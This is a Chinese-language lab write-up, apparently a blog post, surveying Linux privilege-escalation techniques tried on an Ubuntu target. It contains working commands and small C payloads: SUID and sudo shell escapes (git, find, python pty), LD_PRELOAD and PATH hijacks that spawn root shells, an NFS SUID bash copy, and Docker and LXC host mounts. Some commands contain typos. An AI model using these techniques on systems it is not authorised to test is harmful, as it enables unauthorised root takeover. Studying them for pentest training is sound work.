## 0X00前言

2022年的暑假，我获得了参加hvv的机会，但是因为hvv的面试，使得我对提权这一方面，产生了巨大的阴影。恰好因为hvv的延期，使得作者这个小白被迫加入了"卷"的生活；因此，对Liunx提权的研究有了，一点自己的理解，于是写下文章，期待与大家的交流！！！（该Linux的版本为Ubuntu的21.X版本，所以有很多的提权方法因为版本或者单纯因为配置原因无法成功复现，还希望大家理解）

![1658135917617-5bc0967c-0ec9-4d9a-8e45-8030a1e43654.png](https://image.3001.net/images/20220718/1658159554_62d581c2cb9b0caac3fff.png!small)

比起Windows提权，Linux的提权思路大体就分为个人理解的图上四个大类；每个大类都有各自的侧重点，比如：有的提权方式比较隐蔽但容易防御；有的提权方式需要对环境变量非常熟悉；有的提权方式需要前置条件；还有的特权方式只需要使用脚本......我们只有理解他们的不同，再通过自己的经验，寻找适合我们的提权方式，就可以达到一个比较好的攻击效果或者更据自己学习的"经验"去判断攻击的方式！

## 0X01配置提权小结

* * *

#### 漏洞复现环境与目标

  

 **漏洞环境**

  * 一台kali(22版)攻击机
  * 一台Ubuntu(21版)目标机

 **漏洞目标**

  1. 获取目标机root权限
  2. 分析如何进行防御

### 通过敏感命令执行提权

* * *

#### 利用SUID二进制文件进行提权

  

  1. `SUID`权限只能设置二进制文件，且只有程序执行过程中为`root`权限
  2. 命令执行者要有二进制文件的执行权，并且执行时可以获得该程序的属主身份

演示案列：输入cp 替换到桌面password，利用vim修改添加账号密码(Root权限的)，进行越权！

首先，我们确定cp命令是否有SUID权限（如果没有可以进行如下配置），如下图所示：

![1658139648990-e2367002-d218-463c-91ca-38ee3419febc.png](https://image.3001.net/images/20220718/1658159555_62d581c3c200130c36bba.png!small)  
可能小白对于Liunx的命令不是特别清楚，所以我对命令进行了解释说明；希望对大家有帮助！！

    
    
    //查找cp命令所在的位置（通过查找结果/bin/cp的位置可以告诉我们cp是所有用户都可以使用的命令）
    which cp
    //查看并显示当前目录下的所有文件的属性（la命令 – 显示当前目录下的所有文件）
    ls -la /usr/bin/cp
    //修改权限，将只有某用户可以执行这条命令，变成root权限（u+s后其他用户都可享有文件属主的权限）
    chmod u+s /usr/bin/cp

但是我们在日常情况下应当使用`find / -perm -u=s -type f
2>/dev/null`（find表示查找；-perm表示指定权限；-u=s指的是指定的SUID权限；-type是指的文件类型；f表示常规的文件类型）来确定cp或者其他命令是否存在SUID权限

![](https://image.3001.net/images/20220812/1660289840_62f6033058df0b5856aeb.png!small)

cp的权限已经存在了！（不过在下面不方便截图），这个时候我们就可以开始准备SUID提权了！

  1. 通过kali伪造passwd的文件（OpenSSL：[GitHub项目地址](https://github.com/openssl/openssl)）
  2. 利用`cp /ect/passwd .`命令，将passwd复制到桌面
  3. 将伪造文件添加到passwd即可
  4. 更据伪造用户密码，登录目标，获得root权限！！

提示：作者这边出现了一些问题，导致实验失败！！

 **find命令提权**
：通过`-exec参数`指定其它命令，以便于来执行写入的命令，输出结果；写入的命令后接分号表示结束（在bash环境中分号代表代码块结束，具有特殊意义，所以这需要进行转义

![](https://image.3001.net/images/20220812/1660289982_62f603bebb78ad48cef87.png!small)

####  **利用sudo进行提权**

sudo和su的区别是什么？

答：sudo是以root权限去运行命令，它需要自己输入的密码即可；su是去切换用户的身份，需要知道被切换用户的密码。

我们知道`/letc/sudoers`文件，是sudo权限的配置文件。当我们使用sudo命令，Linux系统会在sudoers文件中查找当前用户，根据当前用户权限配置来决定是否可以运行相关命令!

![1657704927563-b02c8575-7160-4202-a666-5d11dd46dcc7.png](https://image.3001.net/images/20220718/1658159557_62d581c578c3a4b4601de.png!small)

 **git命令提权** **（搭配sudo）**

  1. `sudo git help config`;`!/bin/bash`
  2. `sudo git -p help`;`!/bin/bash`

操作，如下图所示：

![1658145085434-e603d394-6178-4285-9219-0cc49d6dada5.png](https://image.3001.net/images/20220718/1658159558_62d581c660c9a78441a21.png!small)

![1658145003608-ca603aeb-16a4-40f4-94f2-693de02b8dd2.png](https://image.3001.net/images/20220718/1658159559_62d581c73fab27452c9b3.png!small)

 **暴力破解passwd提权**

攻击者通过SCP复制passwd后，拷贝到本地，通过复制passwd，对密码进行一个破解

john破解工具（GitHub项目：[地址](https://github.com/openwall/john)）

 **小提示** ：还可以制作shell，通过vim，find.....进行提权操作！！！

#### 利用延时任务提权

`Cronjobs`是指定时任务，在特定的日期和时间执行计划任务！（[unix-privesc-check项目地址](http://pentestmonkey.net/tools/audit/unix-privesc-check)）

  

 **Cronjobs提权**

  

  * `ls **-** l **/** etc **/** cron *****`
  * `cat /etc/crontab`

![](https://image.3001.net/images/20220812/1660290050_62f604025e5e4a2679996.png!small)

但是Ubuntu没有成功实现这个权限！（关于原因，应该是没有赋予配置ALL中的权限！）

![1658155771494-deff1cda-0039-4eef-97c4-981f5416980c.png](https://image.3001.net/images/20220718/1658159560_62d581c86a0bbe1cbac36.png!small)

####  **利用系统赋权限提权**

  

`Capability`可分割Linux系统的root权限，把root特权分割成不同的属性，然后给与普通用户不同的属性，每一种能力都代表着一种特权。

    
    
    - CAP_CHOWN:修改文件属主的权限
    
    - CAP_DAC_OVERRIDE:忽略文件的DAC访问限制
    
    - CAP_DAC_READ_SEARCH:忽略文件读及目录搜索的DAC访问限制
    
    - CAP_FOWNER：忽略文件属主ID必须和进程用户ID相匹配的限制
    
    - CAP_FSETID:允许设置文件的setuid位
    
    - CAP_KILL:允许对不属于自己的进程发送信号
    
    - CAP_SETGID:允许改变进程的组ID
    
    - CAP_SETUID:允许改变进程的用户ID
    
    - CAP_SETPCAP:允许向其他进程转移能力以及删除其他进程的能力
    
    - CAP_LINUX_IMMUTABLE:允许修改文件的IMMUTABLE和APPEND属性标志
    
    - CAP_NET_BIND_SERVICE:允许绑定到小于1024的端口
    
    - CAP_NET_BROADCAST:允许网络广播和多播访问
    
    - CAP_NET_ADMIN:允许执行网络管理任务
    
    - CAP_NET_RAW:允许使用原始套接字
    
    - CAP_IPC_LOCK:允许锁定共享内存片段
    
    - CAP_IPC_OWNER:忽略IPC所有权检查
    
    - CAP_SYS_MODULE:允许插入和删除内核模块
    
    - CAP_SYS_RAWIO:允许直接访问/devport,/dev/mem,/dev/kmem及原始块设备
    
    - CAP_SYS_CHROOT:允许使用chroot()系统调用
    
    - CAP_SYS_PTRACE:允许跟踪任何进程
    
    - CAP_SYS_PACCT:允许执行进程的BSD式审计
    
    - CAP_SYS_ADMIN:允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等
    
    - CAP_SYS_BOOT:允许重新启动系统
    
    - CAP_SYS_NICE:允许提升优先级及设置其他进程的优先级
    
    - CAP_SYS_RESOURCE:忽略资源限制
    
    - CAP_SYS_TIME:允许改变系统时钟
    
    - CAP_SYS_TTY_CONFIG:允许配置TTY设备
    
    - CAP_MKNOD:允许使用mknod()系统调用
    
    - CAP_LEASE:允许修改文件锁的FL_LEASE标志

 **Capability提权**

步骤如图所示：（这里的cp应该加入到ALL中去，否则执行失败）

![](https://image.3001.net/images/20220812/1660290116_62f60444f3a9a4b62e09c.png!small)

###

### 通过环境变量配置问题提权

* * *

#### 使用PATH变量进行提权

Linux中的PATH是一个环境变量，它指定了可执行程序所在的目录。(eg：`bin`和`sbin`两个常见的目录）当我们在终端执行命令的时候，系统就会根据PATH来查找相关的可执行文件，这个时候系统的权限就是root！

 **提示** ：该漏洞成功利用的前提是可以上传文件！

    
    
    #include<unistd.h>
    void main()
    {
        //当setuid位被设置之后， 当文件或程序被执行时, 操作系统会赋予文件所有者的权限
        setuid(0);
        //setuid和setgid都是让普通用户可以以root用户的角色运行只有root帐号才能运行的程序或命令
        setgid(0);
        //ps命令：显示现行终端机下的所有程序,包括其他用户的程序
        system("ps");
    }

 **制作shell（kali）**

![](https://image.3001.net/images/20220812/1660290156_62f6046c98eb30bc0ec1c.png!small)

 **CP搭配PATH提权**

![](https://image.3001.net/images/20220812/1660290190_62f6048e5f9e268fa697d.png!small)

还有其他的方法，但是都失败了！（这里的cp应该加入到ALL中去，否则执行失败）

![1658151205605-14deca30-0eb8-48a2-9539-458fae97f653.png](https://image.3001.net/images/20220718/1658159562_62d581ca63a465603bce1.png!small)

####  

####  **使用LD_PRELOAD进行提权**

`LD_PRELOAD`是Linux下的一个环境变量，程序运行时都会加载一些`so文件`，类似于windows下程序加载dll，而该环境变量可以指定程序运行前加载的动态连接库。这个时候就和PATH环境变量一样，通过上传`so文件`容易受到提权攻击！

    
    
    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>
    void _init() { 
            unsetenv("LD_PRELOAD");
            setgid(0);
            setuid(0);
            system("/bin/sh");
    }

该漏洞攻击方法，可以参考PATH的攻击方法！！！

  

  * #给shell.os进行权限赋值，及检测权限：`chmod 777 shell.os；``ll shell.os`
  * #这里的find的权限是经过特定配置的（一般不会这样设置）：`sudo LD_PRELOAD=/tmp/shell.os find`

### 通过应用程序权限提权

* * *

#### python执行提权

我们发现通过python的-c参数，搭配sudo执行python代码（`sudo python -c 'import
pty;pty.spawn("/bin/bash")'`），会造成攻击者获得root权限！（pty是python的一个伪造的终端库）

![1658146092477-3759082b-9110-45f2-8b06-90ac2ebd1551.png](https://image.3001.net/images/20220718/1658159563_62d581cb240a637f3c61e.png!small)

 **小提示** ：可能是版本问题或者配置问题！在某些情况下，执行该命令不需要普通用户密码！

####  

####  **NFS配置不当导致的提权**

这种情况我们可以直接通过nmap脚本（`nmap --script=nfs-showmount 目标IP地址`），直接解决战斗！

NFS提权

  

  1. 首先，客户端把目标机nfs的共享挂载到本地：`mkdir /temp/text`;`mount -t nfs IP地址:/home /tmp/text`;`cd /temp/text`
  2. 然后，把bash复制进去并赋予suid权限:`cp /temp/text`;`chomd +s bash`;`ll bash(确定权限)`
  3. 最后，普通用户执行即可获取root权限：`cd /home`;`./bash -p`（注意需要加上p参数，否则权限还是当前用户权限）

####  

####  **利用虚拟机权限提权**

虚拟容器

  

  * Lxc：是一个系统容器，使进程之间相互隔离，进程虚拟化
  * Lxd：和Lxc作用相同，只不过多了一个管理容器（即Lxc）的作用
  * Docker：Docker是应用程序容器。

 **总结** ：Lxc是系统容器==Lxd是系统容器；Docker是应用程序容器。

Docker利用环境搭建（yu是表示普通用户名，大家复现时，换成自己的普通用户名就可以了），如下图所示：

![1658147152116-5f8ca0a0-7622-4075-a781-3ed27c45c9ad.png](https://image.3001.net/images/20220718/1658159564_62d581cc07222f7092ac4.png!small)

这个的目的是对组（group）环境进行配置，因为Docker里面的执行的权限是root权限，所以我们要通过提权的方式拿到这个Docker的执行权限！

  

 **Docker提权命令**

  

  * `docker run -v /root:/mnt -it alpine`
  * `docker run -v /etc/:/mnt -it alpine`

 **小提示** ：命令执行正常情况下，dockr的返回值是134而不是998！！！（笔者就是因为这个原因导致提权失败）

  

 **Lxc提权命令**

    
    
    # lxc init来初始化myimage，也就是alpine系统，并创建aaa账户，这里指的就是自己，通过c参数来配置安全提升策略为true，代表aaa可申请高级权限，命令如下：
    lxc init myimage aaa -c security.privileged=true
    # lxc config device命令用来配置设备，add把mydevice设备添加到了aaa账户中，disk是磁盘挂载，把本机/目录挂载到容器的/mnt下，recursive即是否递归，代表是否将所有子目录及所有文件进行挂载，命令如下：
    lxc config device add aaa mydevice disk source=/ path=/mnt/root recursive=true
    # 然后利用lxc start来启动刚刚添加的用户
    lxc start aaa
    # 最后利用lxc exec来执行程序，以aaa执行sh
    lxc exec aaa /bin/sh

## 0X02内核漏洞提权小结

* * *

### Liunx历史漏洞查询(cxsecurity社区)

专业网站；例如：https://cxsecurity.com（它首页的底部有相关产品或者系统的CVE汇总，其中有linux
kemel，可以查看最新的关于linux内核CVE问题，但是只提供相关编号和介绍，最新的可能没有exp）

获取内核版本后，可以搜索该版本存在哪些漏洞可以用来进行提权，例如常用的检测脚本:

  

    
    
    linux-exploit-suggester2：GitHub项目地址
    
    linux-kermelexploits：GitHub项目地址

 **小提示**
：但在一些最新提权漏洞上，更新可能并不是很快，例如CVE2020等提权漏洞。如果碰到目标机内核比较新，可能就需要自己去手动搜索相关问题，谷歌相关的关键字，或者找一些在线网站搜索！

### Linux检测脚本

针对非漏洞的相关提权方法，以及搜集Linux上相关的敏感信息，这里可以参考些脚本，例如:

    
    
    LinuEnum: https://github.com/rebootuser/LinEnum
    
    BeRoot: https://github.com/AlessandroZ/BeRoot
    
    Linux-smart-enumeration: https://github.comldiego-treitos/linux-smart-enumeration

## 0X03小结

* * *

通过上述的命令，我们可以简单的进行linux的提权攻击，但是关于Lxc提权的具体原因和其他环境的配置问题，笔者也有一些不懂，所以笔者在此抛砖引玉，希望和大家一起思考，这些方法提权的本质！

